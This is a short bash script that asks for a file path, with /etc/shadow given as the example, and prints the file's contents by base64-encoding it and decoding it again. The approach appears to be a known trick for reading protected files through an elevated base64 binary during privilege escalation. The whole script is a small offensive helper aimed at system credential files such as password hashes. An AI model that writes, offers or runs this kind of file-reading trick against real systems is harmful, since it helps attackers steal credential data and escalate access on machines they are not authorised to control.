#!/bin/bash
echo -n "[+] Enter file path(eg:- /etc/shadow): "
read filepath
base64 "$filepath" | base64 --decode
